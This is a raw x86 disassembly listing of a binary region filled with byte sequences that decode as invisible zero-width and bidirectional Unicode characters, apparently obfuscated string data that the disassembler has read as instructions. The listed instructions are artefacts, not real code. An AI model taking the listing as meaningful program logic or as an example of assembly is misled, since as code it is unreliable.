  40a9d2:	ab                   	stos   %eax,%es:(%edi)
  40a9d3:	e2 80                	loop   0x40a955
  40a9d5:	8b e2                	mov    %edx,%esp
  40a9d7:	81 ab e2 81 ac e2 81 	subl   $0x80e2ad81,-0x1d537e1e(%ebx)
  40a9de:	ad e2 80 
  40a9e1:	aa                   	stos   %al,%es:(%edi)
  40a9e2:	e2 80                	loop   0x40a964
  40a9e4:	8e e2                	mov    %edx,%fs
  40a9e6:	80 ac e2 80 8f e2 81 	subb   $0xad,-0x7e1d7080(%edx,%eiz,8)
  40a9ed:	ad 
  40a9ee:	e2 80                	loop   0x40a970
  40a9f0:	ac                   	lods   %ds:(%esi),%al
  40a9f1:	e2 81                	loop   0x40a974
  40a9f3:	ac                   	lods   %ds:(%esi),%al
  40a9f4:	e2 80                	loop   0x40a976
  40a9f6:	8b e2                	mov    %edx,%esp
  40a9f8:	80 8e e2 80 ae e2 80 	orb    $0x80,-0x1d517f1e(%esi)
  40a9ff:	ae                   	scas   %es:(%edi),%al
  40aa00:	e2 80                	loop   0x40a982
  40aa02:	ae                   	scas   %es:(%edi),%al
  40aa03:	00 e2                	add    %ah,%dl
  40aa05:	80 ae e2 81 ad e2 80 	subb   $0x80,-0x1d527e1e(%esi)
  40aa0c:	ac                   	lods   %ds:(%esi),%al
  40aa0d:	e2 80                	loop   0x40a98f
  40aa0f:	ad                   	lods   %ds:(%esi),%eax
  40aa10:	e2 81                	loop   0x40a993
  40aa12:	ab                   	stos   %eax,%es:(%edi)
  40aa13:	e2 80                	loop   0x40a995
  40aa15:	ad                   	lods   %ds:(%esi),%eax
  40aa16:	e2 80                	loop   0x40a998
  40aa18:	aa                   	stos   %al,%es:(%edi)
  40aa19:	e2 80                	loop   0x40a99b
  40aa1b:	ab                   	stos   %eax,%es:(%edi)
  40aa1c:	e2 80                	loop   0x40a99e
  40aa1e:	8d                   	lea    (bad),%esp
  40aa1f:	e2 80                	loop   0x40a9a1
  40aa21:	8f                   	(bad)
  40aa22:	e2 81                	loop   0x40a9a5
  40aa24:	aa                   	stos   %al,%es:(%edi)
  40aa25:	e2 80                	loop   0x40a9a7
  40aa27:	ab                   	stos   %eax,%es:(%edi)
  40aa28:	e2 81                	loop   0x40a9ab
  40aa2a:	ab                   	stos   %eax,%es:(%edi)
  40aa2b:	e2 80                	loop   0x40a9ad
  40aa2d:	8b e2                	mov    %edx,%esp
  40aa2f:	81 ae e2 80 8e e2 80 	subl   $0x81e2ac80,-0x1d717f1e(%esi)
  40aa36:	ac e2 81 
  40aa39:	ac                   	lods   %ds:(%esi),%al
  40aa3a:	e2 80                	loop   0x40a9bc
  40aa3c:	8e e2                	mov    %edx,%fs
  40aa3e:	80 ab e2 81 aa e2 81 	subb   $0x81,-0x1d557e1e(%ebx)
  40aa45:	ab                   	stos   %eax,%es:(%edi)
  40aa46:	e2 80                	loop   0x40a9c8
  40aa48:	ac                   	lods   %ds:(%esi),%al
  40aa49:	e2 81                	loop   0x40a9cc
  40aa4b:	aa                   	stos   %al,%es:(%edi)
  40aa4c:	e2 80                	loop   0x40a9ce
  40aa4e:	ac                   	lods   %ds:(%esi),%al
  40aa4f:	e2 80                	loop   0x40a9d1
  40aa51:	ac                   	lods   %ds:(%esi),%al
  40aa52:	e2 81                	loop   0x40a9d5
  40aa54:	ae                   	scas   %es:(%edi),%al
  40aa55:	e2 80                	loop   0x40a9d7
  40aa57:	ab                   	stos   %eax,%es:(%edi)
  40aa58:	e2 81                	loop   0x40a9db
  40aa5a:	aa                   	stos   %al,%es:(%edi)
  40aa5b:	e2 81                	loop   0x40a9de
  40aa5d:	ad                   	lods   %ds:(%esi),%eax
  40aa5e:	e2 81                	loop   0x40a9e1
  40aa60:	ab                   	stos   %eax,%es:(%edi)
  40aa61:	e2 81                	loop   0x40a9e4
  40aa63:	af                   	scas   %es:(%edi),%eax
  40aa64:	e2 80                	loop   0x40a9e6
  40aa66:	ac                   	lods   %ds:(%esi),%al
  40aa67:	e2 81                	loop   0x40a9ea
  40aa69:	ad                   	lods   %ds:(%esi),%eax
  40aa6a:	e2 81                	loop   0x40a9ed
  40aa6c:	af                   	scas   %es:(%edi),%eax
  40aa6d:	e2 81                	loop   0x40a9f0
  40aa6f:	ab                   	stos   %eax,%es:(%edi)
  40aa70:	e2 81                	loop   0x40a9f3
  40aa72:	ab                   	stos   %eax,%es:(%edi)
  40aa73:	e2 80                	loop   0x40a9f5
  40aa75:	8b e2                	mov    %edx,%esp
  40aa77:	81 af e2 80 ae e2 80 	subl   $0xe200ae80,-0x1d517f1e(%edi)
  40aa7e:	ae 00 e2 
  40aa81:	80 8b e2 80 ae e2 81 	orb    $0x81,-0x1d517f1e(%ebx)
  40aa88:	ad                   	lods   %ds:(%esi),%eax
  40aa89:	e2 81                	loop   0x40aa0c
  40aa8b:	af                   	scas   %es:(%edi),%eax
  40aa8c:	e2 81                	loop   0x40aa0f
  40aa8e:	ac                   	lods   %ds:(%esi),%al
  40aa8f:	e2 81                	loop   0x40aa12
  40aa91:	af                   	scas   %es:(%edi),%eax
  40aa92:	e2 80                	loop   0x40aa14
  40aa94:	ae                   	scas   %es:(%edi),%al
  40aa95:	e2 80                	loop   0x40aa17
  40aa97:	ac                   	lods   %ds:(%esi),%al
  40aa98:	e2 81                	loop   0x40aa1b
  40aa9a:	af                   	scas   %es:(%edi),%eax
  40aa9b:	e2 80                	loop   0x40aa1d
  40aa9d:	ad                   	lods   %ds:(%esi),%eax
  40aa9e:	e2 81                	loop   0x40aa21
  40aaa0:	ae                   	scas   %es:(%edi),%al
  40aaa1:	e2 81                	loop   0x40aa24
  40aaa3:	ab                   	stos   %eax,%es:(%edi)
  40aaa4:	e2 81                	loop   0x40aa27
  40aaa6:	aa                   	stos   %al,%es:(%edi)
  40aaa7:	e2 80                	loop   0x40aa29
  40aaa9:	8e e2                	mov    %edx,%fs
  40aaab:	81 ab e2 81 ae e2 81 	subl   $0x80e2ad81,-0x1d517e1e(%ebx)
  40aab2:	ad e2 80 
  40aab5:	ab                   	stos   %eax,%es:(%edi)
  40aab6:	e2 80                	loop   0x40aa38
  40aab8:	aa                   	stos   %al,%es:(%edi)
  40aab9:	e2 81                	loop   0x40aa3c
  40aabb:	aa                   	stos   %al,%es:(%edi)
  40aabc:	e2 80                	loop   0x40aa3e
  40aabe:	ad                   	lods   %ds:(%esi),%eax
  40aabf:	e2 81                	loop   0x40aa42
  40aac1:	aa                   	stos   %al,%es:(%edi)
  40aac2:	e2 80                	loop   0x40aa44
  40aac4:	ad                   	lods   %ds:(%esi),%eax
  40aac5:	e2 80                	loop   0x40aa47
  40aac7:	8d                   	lea    (bad),%esp
  40aac8:	e2 80                	loop   0x40aa4a
  40aaca:	8d                   	lea    (bad),%esp
  40aacb:	e2 80                	loop   0x40aa4d
  40aacd:	ab                   	stos   %eax,%es:(%edi)
  40aace:	e2 80                	loop   0x40aa50
  40aad0:	8c e2                	mov    %fs,%edx
  40aad2:	80 8d e2 81 aa e2 80 	orb    $0x80,-0x1d557e1e(%ebp)
  40aad9:	ae                   	scas   %es:(%edi),%al
  40aada:	e2 81                	loop   0x40aa5d
  40aadc:	ad                   	lods   %ds:(%esi),%eax
  40aadd:	e2 81                	loop   0x40aa60
  40aadf:	aa                   	stos   %al,%es:(%edi)
  40aae0:	e2 80                	loop   0x40aa62
  40aae2:	8d                   	lea    (bad),%esp
  40aae3:	e2 81                	loop   0x40aa66
  40aae5:	ac                   	lods   %ds:(%esi),%al
  40aae6:	e2 80                	loop   0x40aa68
  40aae8:	ac                   	lods   %ds:(%esi),%al
  40aae9:	e2 81                	loop   0x40aa6c
  40aaeb:	ae                   	scas   %es:(%edi),%al
  40aaec:	e2 80                	loop   0x40aa6e
  40aaee:	ab                   	stos   %eax,%es:(%edi)
  40aaef:	e2 80                	loop   0x40aa71
  40aaf1:	8b e2                	mov    %edx,%esp
  40aaf3:	80 8b e2 81 ae e2 80 	orb    $0x80,-0x1d517e1e(%ebx)
  40aafa:	ae                   	scas   %es:(%edi),%al
  40aafb:	00 e2                	add    %ah,%dl
  40aafd:	81 ac e2 80 ad e2 81 	subl   $0xab80e2ad,-0x7e1d5280(%edx,%eiz,8)
  40ab04:	ad e2 80 ab 
  40ab08:	e2 80                	loop   0x40aa8a
  40ab0a:	8b e2                	mov    %edx,%esp
  40ab0c:	80 8c e2 80 8c e2 81 	orb    $0xae,-0x7e1d7380(%edx,%eiz,8)
  40ab13:	ae 
  40ab14:	e2 80                	loop   0x40aa96
  40ab16:	ae                   	scas   %es:(%edi),%al
  40ab17:	e2 81                	loop   0x40aa9a
  40ab19:	ac                   	lods   %ds:(%esi),%al
  40ab1a:	e2 80                	loop   0x40aa9c
  40ab1c:	8c e2                	mov    %fs,%edx
  40ab1e:	81 af e2 80 8b e2 81 	subl   $0x80e2aa81,-0x1d747f1e(%edi)
  40ab25:	aa e2 80 
  40ab28:	ae                   	scas   %es:(%edi),%al
  40ab29:	e2 80                	loop   0x40aaab
  40ab2b:	ae                   	scas   %es:(%edi),%al
  40ab2c:	e2 81                	loop   0x40aaaf
  40ab2e:	ab                   	stos   %eax,%es:(%edi)
  40ab2f:	e2 80                	loop   0x40aab1
  40ab31:	8c e2                	mov    %fs,%edx
  40ab33:	81 ae e2 81 ac e2 81 	subl   $0x81e2ab81,-0x1d537e1e(%esi)
  40ab3a:	ab e2 81 
  40ab3d:	ac                   	lods   %ds:(%esi),%al
  40ab3e:	e2 80                	loop   0x40aac0
  40ab40:	ad                   	lods   %ds:(%esi),%eax
  40ab41:	e2 80                	loop   0x40aac3
  40ab43:	ad                   	lods   %ds:(%esi),%eax
  40ab44:	e2 80                	loop   0x40aac6
  40ab46:	8d                   	lea    (bad),%esp
  40ab47:	e2 80                	loop   0x40aac9
  40ab49:	ab                   	stos   %eax,%es:(%edi)
  40ab4a:	e2 80                	loop   0x40aacc
  40ab4c:	ad                   	lods   %ds:(%esi),%eax
  40ab4d:	e2 80                	loop   0x40aacf
  40ab4f:	8c e2                	mov    %fs,%edx
  40ab51:	81 af e2 81 af e2 80 	subl   $0x81e28e80,-0x1d507e1e(%edi)
  40ab58:	8e e2 81 
  40ab5b:	ad                   	lods   %ds:(%esi),%eax
  40ab5c:	e2 81                	loop   0x40aadf
  40ab5e:	af                   	scas   %es:(%edi),%eax
  40ab5f:	e2 80                	loop   0x40aae1
  40ab61:	8f                   	(bad)
  40ab62:	e2 81                	loop   0x40aae5
  40ab64:	aa                   	stos   %al,%es:(%edi)
  40ab65:	e2 80                	loop   0x40aae7
  40ab67:	ad                   	lods   %ds:(%esi),%eax
  40ab68:	e2 81                	loop   0x40aaeb
  40ab6a:	ad                   	lods   %ds:(%esi),%eax
  40ab6b:	e2 80                	loop   0x40aaed
  40ab6d:	8b e2                	mov    %edx,%esp
  40ab6f:	80 8d e2 81 ae e2 80 	orb    $0x80,-0x1d517e1e(%ebp)
  40ab76:	ae                   	scas   %es:(%edi),%al
  40ab77:	00 e2                	add    %ah,%dl
  40ab79:	80 8d e2 81 af e2 81 	orb    $0x81,-0x1d507e1e(%ebp)
  40ab80:	af                   	scas   %es:(%edi),%eax
  40ab81:	e2 81                	loop   0x40ab04
  40ab83:	af                   	scas   %es:(%edi),%eax
  40ab84:	e2 80                	loop   0x40ab06
  40ab86:	8c e2                	mov    %fs,%edx
  40ab88:	80 ac e2 80 8d e2 80 	subb   $0xab,-0x7f1d7280(%edx,%eiz,8)
  40ab8f:	ab 
  40ab90:	e2 80                	loop   0x40ab12
  40ab92:	8c e2                	mov    %fs,%edx
  40ab94:	81 ae e2 80 ab e2 80 	subl   $0x80e28e80,-0x1d547f1e(%esi)
  40ab9b:	8e e2 80 
  40ab9e:	8b e2                	mov    %edx,%esp
  40aba0:	81 aa e2 81 ac e2 80 	subl   $0x80e28d80,-0x1d537e1e(%edx)
  40aba7:	8d e2 80 
  40abaa:	ab                   	stos   %eax,%es:(%edi)
  40abab:	e2 80                	loop   0x40ab2d
  40abad:	8e e2                	mov    %edx,%fs
  40abaf:	80 8c e2 80 ae e2 80 	orb    $0x8c,-0x7f1d5180(%edx,%eiz,8)
  40abb6:	8c 
  40abb7:	e2 81                	loop   0x40ab3a
  40abb9:	ac                   	lods   %ds:(%esi),%al
  40abba:	e2 80                	loop   0x40ab3c
  40abbc:	8f                   	(bad)
  40abbd:	e2 80                	loop   0x40ab3f
  40abbf:	ae                   	scas   %es:(%edi),%al
  40abc0:	e2 81                	loop   0x40ab43
  40abc2:	ac                   	lods   %ds:(%esi),%al
  40abc3:	e2 80                	loop   0x40ab45
  40abc5:	8f                   	(bad)
  40abc6:	e2 81                	loop   0x40ab49
  40abc8:	ac                   	lods   %ds:(%esi),%al
  40abc9:	e2 80                	loop   0x40ab4b
  40abcb:	ae                   	scas   %es:(%edi),%al
  40abcc:	e2 80                	loop   0x40ab4e
  40abce:	ae                   	scas   %es:(%edi),%al
  40abcf:	e2 80                	loop   0x40ab51
  40abd1:	8c e2                	mov    %fs,%edx
  40abd3:	80 8b e2 80 8b e2 80 	orb    $0x80,-0x1d747f1e(%ebx)
  40abda:	8d                   	lea    (bad),%esp
  40abdb:	e2 81                	loop   0x40ab5e
  40abdd:	aa                   	stos   %al,%es:(%edi)
  40abde:	e2 80                	loop   0x40ab60
  40abe0:	ae                   	scas   %es:(%edi),%al
  40abe1:	e2 80                	loop   0x40ab63
  40abe3:	ad                   	lods   %ds:(%esi),%eax
  40abe4:	e2 80                	loop   0x40ab66
  40abe6:	ab                   	stos   %eax,%es:(%edi)
  40abe7:	e2 80                	loop   0x40ab69
  40abe9:	8c e2                	mov    %fs,%edx
  40abeb:	80 aa e2 81 ae e2 80 	subb   $0x80,-0x1d517e1e(%edx)
  40abf2:	ae                   	scas   %es:(%edi),%al
  40abf3:	00 e2                	add    %ah,%dl
  40abf5:	80 aa e2 80 8e e2 81 	subb   $0x81,-0x1d717f1e(%edx)
  40abfc:	ae                   	scas   %es:(%edi),%al
  40abfd:	e2 81                	loop   0x40ab80
  40abff:	ab                   	stos   %eax,%es:(%edi)
  40ac00:	e2 81                	loop   0x40ab83
  40ac02:	ad                   	lods   %ds:(%esi),%eax
  40ac03:	e2 80                	loop   0x40ab85
  40ac05:	ac                   	lods   %ds:(%esi),%al
  40ac06:	e2 81                	loop   0x40ab89
  40ac08:	ae                   	scas   %es:(%edi),%al
  40ac09:	e2 80                	loop   0x40ab8b
  40ac0b:	8f                   	(bad)
  40ac0c:	e2 81                	loop   0x40ab8f
  40ac0e:	ac                   	lods   %ds:(%esi),%al
  40ac0f:	e2 81                	loop   0x40ab92
  40ac11:	ac                   	lods   %ds:(%esi),%al
  40ac12:	e2 80                	loop   0x40ab94
  40ac14:	aa                   	stos   %al,%es:(%edi)
  40ac15:	e2 81                	loop   0x40ab98
  40ac17:	ac                   	lods   %ds:(%esi),%al
  40ac18:	e2 80                	loop   0x40ab9a
  40ac1a:	ad                   	lods   %ds:(%esi),%eax
  40ac1b:	e2 81                	loop   0x40ab9e
  40ac1d:	ac                   	lods   %ds:(%esi),%al
  40ac1e:	e2 81                	loop   0x40aba1
  40ac20:	ae                   	scas   %es:(%edi),%al
  40ac21:	e2 80                	loop   0x40aba3
  40ac23:	ac                   	lods   %ds:(%esi),%al
  40ac24:	e2 80                	loop   0x40aba6
  40ac26:	ae                   	scas   %es:(%edi),%al
  40ac27:	e2 80                	loop   0x40aba9
  40ac29:	ad                   	lods   %ds:(%esi),%eax
  40ac2a:	e2 80                	loop   0x40abac
  40ac2c:	8f                   	(bad)
  40ac2d:	e2 80                	loop   0x40abaf
  40ac2f:	8b e2                	mov    %edx,%esp
  40ac31:	80 8b e2 80 8c e2 80 	orb    $0x80,-0x1d737f1e(%ebx)
  40ac38:	ab                   	stos   %eax,%es:(%edi)
  40ac39:	e2 81                	loop   0x40abbc
  40ac3b:	ac                   	lods   %ds:(%esi),%al
  40ac3c:	e2 81                	loop   0x40abbf
  40ac3e:	af                   	scas   %es:(%edi),%eax
  40ac3f:	e2 80                	loop   0x40abc1
  40ac41:	ab                   	stos   %eax,%es:(%edi)
  40ac42:	e2 81                	loop   0x40abc5
  40ac44:	af                   	scas   %es:(%edi),%eax
  40ac45:	e2 80                	loop   0x40abc7
  40ac47:	8d                   	lea    (bad),%esp
  40ac48:	e2 81                	loop   0x40abcb
  40ac4a:	af                   	scas   %es:(%edi),%eax
  40ac4b:	e2 81                	loop   0x40abce
  40ac4d:	ad                   	lods   %ds:(%esi),%eax
  40ac4e:	e2 81                	loop   0x40abd1
  40ac50:	ad                   	lods   %ds:(%esi),%eax
  40ac51:	e2 80                	loop   0x40abd3
  40ac53:	8f                   	(bad)
  40ac54:	e2 81                	loop   0x40abd7
  40ac56:	ab                   	stos   %eax,%es:(%edi)
  40ac57:	e2 80                	loop   0x40abd9
  40ac59:	8d                   	lea    (bad),%esp
  40ac5a:	e2 81                	loop   0x40abdd
  40ac5c:	ab                   	stos   %eax,%es:(%edi)
  40ac5d:	e2 80                	loop   0x40abdf
  40ac5f:	8e e2                	mov    %edx,%fs
  40ac61:	81 ae e2 81 ab e2 81 	subl   $0x81e2aa81,-0x1d547e1e(%esi)
  40ac68:	aa e2 81 
  40ac6b:	ae                   	scas   %es:(%edi),%al
  40ac6c:	e2 80                	loop   0x40abee
  40ac6e:	ae                   	scas   %es:(%edi),%al
  40ac6f:	00 e2                	add    %ah,%dl
  40ac71:	80 8b e2 81 ab e2 80 	orb    $0x80,-0x1d547e1e(%ebx)
  40ac78:	ad                   	lods   %ds:(%esi),%eax
  40ac79:	e2 81                	loop   0x40abfc
  40ac7b:	ae                   	scas   %es:(%edi),%al
  40ac7c:	e2 80                	loop   0x40abfe
  40ac7e:	8e e2                	mov    %edx,%fs
  40ac80:	80 ab e2 81 ae e2 80 	subb   $0x80,-0x1d517e1e(%ebx)
  40ac87:	8b e2                	mov    %edx,%esp
  40ac89:	81 ab e2 80 ae e2 80 	subl   $0x80e2ad80,-0x1d517f1e(%ebx)
  40ac90:	ad e2 80 
  40ac93:	ab                   	stos   %eax,%es:(%edi)
  40ac94:	e2 81                	loop   0x40ac17
  40ac96:	af                   	scas   %es:(%edi),%eax
  40ac97:	e2 80                	loop   0x40ac19
  40ac99:	8e e2                	mov    %edx,%fs
  40ac9b:	81 ac e2 80 ad e2 81 	subl   $0x8d80e2ab,-0x7e1d5280(%edx,%eiz,8)
  40aca2:	ab e2 80 8d 
  40aca6:	e2 80                	loop   0x40ac28
  40aca8:	ac                   	lods   %ds:(%esi),%al
  40aca9:	e2 80                	loop   0x40ac2b
  40acab:	ad                   	lods   %ds:(%esi),%eax
  40acac:	e2 80                	loop   0x40ac2e
  40acae:	8b e2                	mov    %edx,%esp
  40acb0:	80 8f e2 80 8f e2 80 	orb    $0x80,-0x1d707f1e(%edi)
  40acb7:	ab                   	stos   %eax,%es:(%edi)
  40acb8:	e2 80                	loop   0x40ac3a
  40acba:	8e e2                	mov    %edx,%fs
  40acbc:	81 ad e2 80 8c e2 81 	subl   $0x80e2ab81,-0x1d737f1e(%ebp)
  40acc3:	ab e2 80 
  40acc6:	8b e2                	mov    %edx,%esp
  40acc8:	80 aa e2 81 ab e2 80 	subb   $0x80,-0x1d547e1e(%edx)
  40accf:	ab                   	stos   %eax,%es:(%edi)
  40acd0:	e2 80                	loop   0x40ac52
  40acd2:	ad                   	lods   %ds:(%esi),%eax
  40acd3:	e2 81                	loop   0x40ac56
  40acd5:	af                   	scas   %es:(%edi),%eax
  40acd6:	e2 80                	loop   0x40ac58
  40acd8:	8d                   	lea    (bad),%esp
  40acd9:	e2 81                	loop   0x40ac5c
  40acdb:	ae                   	scas   %es:(%edi),%al
  40acdc:	e2 81                	loop   0x40ac5f
  40acde:	ad                   	lods   %ds:(%esi),%eax
  40acdf:	e2 80                	loop   0x40ac61
  40ace1:	aa                   	stos   %al,%es:(%edi)
  40ace2:	e2 80                	loop   0x40ac64
  40ace4:	ac                   	lods   %ds:(%esi),%al
  40ace5:	e2 81                	loop   0x40ac68
  40ace7:	ae                   	scas   %es:(%edi),%al
  40ace8:	e2 80                	loop   0x40ac6a
  40acea:	ae                   	scas   %es:(%edi),%al
  40aceb:	00 e2                	add    %ah,%dl
  40aced:	80 ab e2 80 8d e2 80 	subb   $0x80,-0x1d727f1e(%ebx)
  40acf4:	8d                   	lea    (bad),%esp
  40acf5:	e2 80                	loop   0x40ac77
  40acf7:	ac                   	lods   %ds:(%esi),%al
  40acf8:	e2 80                	loop   0x40ac7a
  40acfa:	8b e2                	mov    %edx,%esp
  40acfc:	80 aa e2 81 aa e2 80 	subb   $0x80,-0x1d557e1e(%edx)
  40ad03:	8e e2                	mov    %edx,%fs
  40ad05:	80 8c e2 80 ab e2 80 	orb    $0x8d,-0x7f1d5480(%edx,%eiz,8)
  40ad0c:	8d 
  40ad0d:	e2 80                	loop   0x40ac8f
  40ad0f:	ae                   	scas   %es:(%edi),%al
  40ad10:	e2 80                	loop   0x40ac92
  40ad12:	8d                   	lea    (bad),%esp
  40ad13:	e2 80                	loop   0x40ac95
  40ad15:	8c e2                	mov    %fs,%edx
  40ad17:	80 8b e2 80 aa e2 80 	orb    $0x80,-0x1d557f1e(%ebx)
  40ad1e:	ad                   	lods   %ds:(%esi),%eax
  40ad1f:	e2 81                	loop   0x40aca2
  40ad21:	aa                   	stos   %al,%es:(%edi)
  40ad22:	e2 81                	loop   0x40aca5
  40ad24:	ad                   	lods   %ds:(%esi),%eax
  40ad25:	e2 80                	loop   0x40aca7
  40ad27:	8d                   	lea    (bad),%esp
  40ad28:	e2 81                	loop   0x40acab
  40ad2a:	ad                   	lods   %ds:(%esi),%eax
  40ad2b:	e2 81                	loop   0x40acae
  40ad2d:	ae                   	scas   %es:(%edi),%al
  40ad2e:	e2 80                	loop   0x40acb0
  40ad30:	8c e2                	mov    %fs,%edx
  40ad32:	81 ab e2 80 8b e2 80 	subl   $0x80e28b80,-0x1d747f1e(%ebx)
  40ad39:	8b e2 80 
  40ad3c:	8d                   	lea    (bad),%esp
  40ad3d:	e2 80                	loop   0x40acbf
  40ad3f:	ab                   	stos   %eax,%es:(%edi)
  40ad40:	e2 81                	loop   0x40acc3
  40ad42:	ad                   	lods   %ds:(%esi),%eax
  40ad43:	e2 80                	loop   0x40acc5
  40ad45:	aa                   	stos   %al,%es:(%edi)
  40ad46:	e2 80                	loop   0x40acc8
  40ad48:	8f                   	(bad)
  40ad49:	e2 80                	loop   0x40accb
  40ad4b:	ac                   	lods   %ds:(%esi),%al
  40ad4c:	e2 80                	loop   0x40acce
  40ad4e:	ab                   	stos   %eax,%es:(%edi)
  40ad4f:	e2 80                	loop   0x40acd1
  40ad51:	8b e2                	mov    %edx,%esp
  40ad53:	80 8c e2 81 ab e2 80 	orb    $0xab,-0x7f1d547f(%edx,%eiz,8)
  40ad5a:	ab 
  40ad5b:	e2 80                	loop   0x40acdd
  40ad5d:	8e e2                	mov    %edx,%fs
  40ad5f:	81 ac e2 81 ae e2 80 	subl   $0x81e200ae,-0x7f1d517f(%edx,%eiz,8)
  40ad66:	ae 00 e2 81 
  40ad6a:	ad                   	lods   %ds:(%esi),%eax
  40ad6b:	e2 81                	loop   0x40acee
  40ad6d:	af                   	scas   %es:(%edi),%eax
  40ad6e:	e2 80                	loop   0x40acf0
  40ad70:	ac                   	lods   %ds:(%esi),%al
  40ad71:	e2 81                	loop   0x40acf4
  40ad73:	ab                   	stos   %eax,%es:(%edi)
  40ad74:	e2 80                	loop   0x40acf6
  40ad76:	aa                   	stos   %al,%es:(%edi)
  40ad77:	e2 80                	loop   0x40acf9
  40ad79:	ad                   	lods   %ds:(%esi),%eax
  40ad7a:	e2 80                	loop   0x40acfc
  40ad7c:	aa                   	stos   %al,%es:(%edi)
  40ad7d:	e2 81                	loop   0x40ad00
  40ad7f:	ab                   	stos   %eax,%es:(%edi)
  40ad80:	e2 80                	loop   0x40ad02
  40ad82:	8b e2                	mov    %edx,%esp
  40ad84:	80 ad e2 80 aa e2 80 	subb   $0x80,-0x1d557f1e(%ebp)
  40ad8b:	aa                   	stos   %al,%es:(%edi)
  40ad8c:	e2 80                	loop   0x40ad0e
  40ad8e:	ac                   	lods   %ds:(%esi),%al
  40ad8f:	e2 81                	loop   0x40ad12
  40ad91:	af                   	scas   %es:(%edi),%eax
  40ad92:	e2 80                	loop   0x40ad14
  40ad94:	8b e2                	mov    %edx,%esp
  40ad96:	81 aa e2 80 8d e2 81 	subl   $0x80e2af81,-0x1d727f1e(%edx)
  40ad9d:	af e2 80 
  40ada0:	ac                   	lods   %ds:(%esi),%al
  40ada1:	e2 81                	loop   0x40ad24
  40ada3:	aa                   	stos   %al,%es:(%edi)
  40ada4:	e2 80                	loop   0x40ad26
  40ada6:	ad                   	lods   %ds:(%esi),%eax
  40ada7:	e2 81                	loop   0x40ad2a
  40ada9:	ab                   	stos   %eax,%es:(%edi)
  40adaa:	e2 80                	loop   0x40ad2c
  40adac:	ab                   	stos   %eax,%es:(%edi)
  40adad:	e2 80                	loop   0x40ad2f
  40adaf:	8c e2                	mov    %fs,%edx
  40adb1:	80 aa e2 80 8b e2 81 	subb   $0x81,-0x1d747f1e(%edx)
  40adb8:	ac                   	lods   %ds:(%esi),%al
  40adb9:	e2 80                	loop   0x40ad3b
  40adbb:	ad                   	lods   %ds:(%esi),%eax
  40adbc:	e2 80                	loop   0x40ad3e
  40adbe:	aa                   	stos   %al,%es:(%edi)
  40adbf:	e2 80                	loop   0x40ad41
  40adc1:	8f                   	(bad)
  40adc2:	e2 80                	loop   0x40ad44
  40adc4:	ad                   	lods   %ds:(%esi),%eax
  40adc5:	e2 81                	loop   0x40ad48
  40adc7:	ad                   	lods   %ds:(%esi),%eax
  40adc8:	e2 81                	loop   0x40ad4b
  40adca:	af                   	scas   %es:(%edi),%eax
  40adcb:	e2 81                	loop   0x40ad4e
  40adcd:	ae                   	scas   %es:(%edi),%al
  40adce:	e2 80                	loop   0x40ad50
  40add0:	aa                   	stos   %al,%es:(%edi)
  40add1:	e2 81                	loop   0x40ad54
  40add3:	aa                   	stos   %al,%es:(%edi)
  40add4:	e2 81                	loop   0x40ad57
  40add6:	aa                   	stos   %al,%es:(%edi)
  40add7:	e2 81                	loop   0x40ad5a
  40add9:	ac                   	lods   %ds:(%esi),%al
  40adda:	e2 81                	loop   0x40ad5d
  40addc:	ac                   	lods   %ds:(%esi),%al
  40addd:	e2 81                	loop   0x40ad60
  40addf:	ae                   	scas   %es:(%edi),%al
  40ade0:	e2 80                	loop   0x40ad62
  40ade2:	ae                   	scas   %es:(%edi),%al
  40ade3:	00 e2                	add    %ah,%dl
  40ade5:	80 ac e2 80 ad e2 80 	subb   $0xae,-0x7f1d5280(%edx,%eiz,8)
  40adec:	ae 
  40aded:	e2 80                	loop   0x40ad6f
  40adef:	8d                   	lea    (bad),%esp
  40adf0:	e2 80                	loop   0x40ad72
  40adf2:	ae                   	scas   %es:(%edi),%al
  40adf3:	e2 81                	loop   0x40ad76
  40adf5:	ac                   	lods   %ds:(%esi),%al
  40adf6:	e2 81                	loop   0x40ad79
  40adf8:	aa                   	stos   %al,%es:(%edi)
  40adf9:	e2 81                	loop   0x40ad7c
  40adfb:	ae                   	scas   %es:(%edi),%al
  40adfc:	e2 80                	loop   0x40ad7e
  40adfe:	ae                   	scas   %es:(%edi),%al
  40adff:	e2 80                	loop   0x40ad81
  40ae01:	8b e2                	mov    %edx,%esp
  40ae03:	81 ac e2 81 ad e2 80 	subl   $0xae81e28f,-0x7f1d527f(%edx,%eiz,8)
  40ae0a:	8f e2 81 ae 
  40ae0e:	e2 81                	loop   0x40ad91
  40ae10:	ad                   	lods   %ds:(%esi),%eax
  40ae11:	e2 80                	loop   0x40ad93
  40ae13:	ad                   	lods   %ds:(%esi),%eax
  40ae14:	e2 81                	loop   0x40ad97
  40ae16:	ab                   	stos   %eax,%es:(%edi)
  40ae17:	e2 81                	loop   0x40ad9a
  40ae19:	af                   	scas   %es:(%edi),%eax
  40ae1a:	e2 81                	loop   0x40ad9d
  40ae1c:	ad                   	lods   %ds:(%esi),%eax
  40ae1d:	e2 81                	loop   0x40ada0
  40ae1f:	af                   	scas   %es:(%edi),%eax
  40ae20:	e2 81                	loop   0x40ada3
  40ae22:	ad                   	lods   %ds:(%esi),%eax
  40ae23:	e2 81                	loop   0x40ada6
  40ae25:	aa                   	stos   %al,%es:(%edi)
  40ae26:	e2 80                	loop   0x40ada8
  40ae28:	ad                   	lods   %ds:(%esi),%eax
  40ae29:	e2 80                	loop   0x40adab
  40ae2b:	8b e2                	mov    %edx,%esp
  40ae2d:	81 ad e2 80 8d e2 80 	subl   $0x80e28c80,-0x1d727f1e(%ebp)
  40ae34:	8c e2 80 
  40ae37:	8c e2                	mov    %fs,%edx
  40ae39:	80 8f e2 80 ad e2 81 	orb    $0x81,-0x1d527f1e(%edi)
  40ae40:	af                   	scas   %es:(%edi),%eax
  40ae41:	e2 81                	loop   0x40adc4
  40ae43:	ab                   	stos   %eax,%es:(%edi)
  40ae44:	e2 81                	loop   0x40adc7
  40ae46:	aa                   	stos   %al,%es:(%edi)
  40ae47:	e2 81                	loop   0x40adca
  40ae49:	ad                   	lods   %ds:(%esi),%eax
  40ae4a:	e2 80                	loop   0x40adcc
  40ae4c:	8c e2                	mov    %fs,%edx
  40ae4e:	80 aa e2 80 ae e2 80 	subb   $0x80,-0x1d517f1e(%edx)
  40ae55:	aa                   	stos   %al,%es:(%edi)
  40ae56:	e2 80                	loop   0x40add8
  40ae58:	ad                   	lods   %ds:(%esi),%eax
  40ae59:	e2 81                	loop   0x40addc
  40ae5b:	ae                   	scas   %es:(%edi),%al
  40ae5c:	e2 80                	loop   0x40adde
